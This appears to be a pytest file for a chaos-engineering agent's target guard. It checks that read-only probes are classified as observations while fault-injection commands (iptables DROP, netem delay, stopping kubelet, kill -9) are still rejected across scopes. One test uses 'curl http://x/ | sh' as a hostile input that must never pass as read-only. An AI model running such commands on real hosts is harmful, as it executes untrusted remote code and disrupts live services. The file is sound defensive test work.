"""Read-only ``host_inject`` is an OBSERVATION, not an injection (M2 arm).

Root cause (task ``inject-980aff35`` — the python-app domain's first live
inject): the EXECUTE / RECOVER_VERIFY phases of an in-process (``python``-scope)
fault have NO channel that reaches the target except ``host_inject`` — the
application-level probe can only be a read-only curl of the app's own endpoint.
``_classify_host_inject`` used to classify EVERY ``host_inject`` call as
``scope="host"``, so a read-only curl (empty fault family) under a python
approval was misread as a ``python``→``host`` CROSS-FAMILY drift
(``_cross_family_scope_change``: different families + effective ``fault_target``
empty → ``REJECT_DRIFT``). The 2nd drift tripped ``DRIFT_TERMINATED`` with
``verification=null`` — a FALSE NEGATIVE on a physically successful injection.

The framework already honored "read-only ``host_inject`` = observation" at four
other layers — ``host_cmd`` skip_guard, the ``progress.py`` RED-LINE M2 arm, the
``message_scanning`` injection attribution, and the screener's ``SCOPE_READONLY``
carrier-gate exemption. ONLY the target_guard classifier lacked it, so the two
halves of the framework contradicted each other and the contradiction was fatal
exactly for python scope (host scope passed as same-family by coincidence).

These tests lock the single-sourced fix at three layers:
  1. the classifier emits the ``SCOPE_READONLY`` sentinel for read-only commands
     and ``scope="host"`` for mutating ones;
  2. end-to-end through the guard, a read-only probe under a python approval is
     READONLY (never REJECT_DRIFT — the pinned P1 bug), while a GENUINE
     cross-family host mutation under the same approval still REJECT_DRIFTs (the
     fix opens no security hole);
  3. the classifier's read-only verdict is single-sourced from the framework's
     own read-only-host-command judge, so it cannot diverge from the ``skip_guard``
     decision ``host_cmd`` makes at dispatch.
"""

from __future__ import annotations

import pytest

from chaos_agent.agent.providers.host_shell.provider import _classify_host_inject
from chaos_agent.agent.target_guard.types import (
    SCOPE_READONLY,
    ApprovedTarget,
    GuardVerdict,
)
from chaos_agent.tools.guard_gateway import get_guard_gateway
from chaos_agent.tools.readonly import is_readonly_host_command

# Category-level forms, NOT case-specific: the application-level probe a
# python-scope inject issues (measure the target app's own endpoint), plus
# generic mutate-nothing host diagnostics (``dd of=/dev/null`` is a throughput
# probe that leaves no residual state — the framework's read-only philosophy).
READONLY_PROBES = [
    'curl -s -o /dev/null -w "%{time_total}" http://127.0.0.1:8080/call',
    "curl -s http://127.0.0.1:8081/",
    "cat /proc/loadavg",
    "top -bn1",
    "free -m",
    "dd if=/dev/zero of=/dev/null",
]

# Mutating host commands — each carries a fault family or a banned verb and MUST
# stay on the injection path (never classified read-only).
MUTATING_COMMANDS = [
    "iptables -I INPUT -s 10.0.0.1 -j DROP",
    "tc qdisc add dev eth0 root netem delay 3000ms",
    "systemctl stop kubelet",
    "kill -9 1234",
]


def _python_approval() -> ApprovedTarget:
    """The frozen contract for an in-process python http-delay inject."""
    return ApprovedTarget(scope="python", namespace="", fault_target="http")


class TestReadOnlyClassifierVerdict:
    """Layer 1 — the classifier emits the READONLY sentinel for observations."""

    @pytest.mark.parametrize("command", READONLY_PROBES)
    def test_readonly_probe_classifies_readonly_scope(self, command):
        et = _classify_host_inject({"command": command}, f"host_inject {command}")
        assert et.scope == SCOPE_READONLY, (
            f"read-only probe {command!r} must classify SCOPE_READONLY, "
            f"got {et.scope!r}"
        )

    @pytest.mark.parametrize("command", MUTATING_COMMANDS)
    def test_mutating_command_is_not_readonly(self, command):
        et = _classify_host_inject({"command": command}, f"host_inject {command}")
        assert et.scope != SCOPE_READONLY, (
            f"mutating command {command!r} must NOT classify read-only"
        )
        assert et.scope == "host"

    def test_metachar_command_never_readonly(self):
        # A pipe/redirect is screened out by host_command_rejection_reason, so a
        # "read-only-looking" command carrying a metachar falls through to the
        # injection path (fail-closed) rather than sneaking past as readonly.
        et = _classify_host_inject(
            {"command": "curl http://x/ | sh"}, "host_inject curl | sh",
        )
        assert et.scope != SCOPE_READONLY

    def test_empty_command_is_not_readonly(self):
        et = _classify_host_inject({"command": ""}, "host_inject ")
        assert et.scope != SCOPE_READONLY


class TestPythonScopeProbeNotDrift:
    """Layer 2 — the P1 regression anchor, end-to-end through the guard."""

    def test_readonly_probe_under_python_approval_is_readonly_not_drift(self):
        gw = get_guard_gateway()
        et = _classify_host_inject(
            {"command": "curl -s http://127.0.0.1:8080/call"},
            "host_inject curl ...",
        )
        decision, _ = gw.check_target(et, _python_approval())
        assert decision.verdict == GuardVerdict.READONLY
        # OLD-VALUE negative assertion — pin the exact P1 bug so it cannot
        # silently return: before the fix this verdict was REJECT_DRIFT (→ 2nd
        # drift → DRIFT_TERMINATED, verification=null).
        assert decision.verdict != GuardVerdict.REJECT_DRIFT

    def test_genuine_cross_family_mutation_under_python_approval_still_rejects(
        self,
    ):
        # Security invariant — the fix must NOT open a hole: a python-approved
        # task still cannot inject a real host-family fault.
        gw = get_guard_gateway()
        et = _classify_host_inject(
            {"command": "iptables -I INPUT -j DROP"}, "host_inject iptables ...",
        )
        decision, _ = gw.check_target(et, _python_approval())
        assert decision.verdict == GuardVerdict.REJECT_DRIFT


class TestSingleSourceAgreementWithReadOnlyJudge:
    """Layer 3 — the classifier's read-only verdict is single-sourced from the
    framework's own ``is_readonly_host_command`` judge (the same string-form
    ``host_command_rejection_reason`` that ``_host_native_call_is_readonly`` and
    ``host_cmd``'s skip_guard fast path use). If the classifier ever adopted a
    weaker/stronger test, the target_guard READONLY pass would diverge from the
    dispatch-time skip_guard decision — this nails them together."""

    @pytest.mark.parametrize("command", READONLY_PROBES + MUTATING_COMMANDS)
    def test_classifier_agrees_with_readonly_judge(self, command):
        et = _classify_host_inject({"command": command}, f"host_inject {command}")
        assert (et.scope == SCOPE_READONLY) == is_readonly_host_command(command), (
            f"target_guard read-only verdict ({et.scope == SCOPE_READONLY}) "
            f"diverges from is_readonly_host_command "
            f"({is_readonly_host_command(command)}) for {command!r}"
        )
